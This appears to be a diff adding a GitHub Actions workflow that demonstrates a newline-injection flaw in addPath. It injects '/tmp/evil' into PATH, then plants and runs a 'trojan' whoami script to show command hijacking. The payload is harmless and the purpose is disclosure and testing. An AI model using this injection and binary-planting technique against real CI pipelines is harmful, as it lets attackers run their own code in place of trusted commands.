@@ -1,0 +1,62 @@
+name: addPath Newline Injection PoC
+on:
+  workflow_dispatch:
+    inputs:
+      tool_path:
+        description: 'Path to add'
+        required: true
+        default: '/usr/local/bin'
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show initial PATH
+        run: echo "Initial PATH entries:" && echo "$PATH" | tr ':' '\n' | head -10
+      
+      - name: Install action with addPath (simulating a setup action)
+        uses: actions/github-script@v7
+        with:
+          script: |
+            // Simulating what a setup-* action does internally
+            // The tool path includes user-controlled version string
+            const toolPath = '/opt/hostedtoolcache/node/18.0.0/x64/bin';
+            
+            // This demonstrates the vulnerability:
+            // A malicious input containing a newline injects an extra PATH entry
+            const injectedPath = toolPath + '\n/tmp/evil';
+            
+            core.addPath(injectedPath);
+            core.info('addPath called with: ' + JSON.stringify(injectedPath));
+      
+      - name: Check if /tmp/evil is in PATH
+        run: |
+          echo "=== PATH after addPath ==="
+          echo "$PATH" | tr ':' '\n' | head -20
+          echo ""
+          echo "=== Check for injected path ==="
+          if echo "$PATH" | tr ':' '\n' | grep -q "/tmp/evil"; then
+            echo "VULNERABLE: /tmp/evil was injected into PATH!"
+          else
+            echo "NOT VULNERABLE: /tmp/evil was not found in PATH"
+          fi
+          
+          echo ""
+          echo "=== GITHUB_PATH file contents ==="
+          cat "$GITHUB_PATH" 2>/dev/null || echo "GITHUB_PATH not readable"
+      
+      - name: Demonstrate code execution via injected PATH
+        run: |
+          # Create a trojan binary in the injected path
+          mkdir -p /tmp/evil
+          cat > /tmp/evil/whoami << 'TROJAN'
+          #!/bin/bash
+          echo "HIJACKED by /tmp/evil/whoami"
+          echo "Original whoami would show: $(which -a whoami | grep -v /tmp | head -1)"
+          /usr/bin/whoami
+          TROJAN
+          chmod +x /tmp/evil/whoami
+          
+          # Now call whoami - it should execute our trojan
+          echo "=== Calling whoami ==="
+          whoami
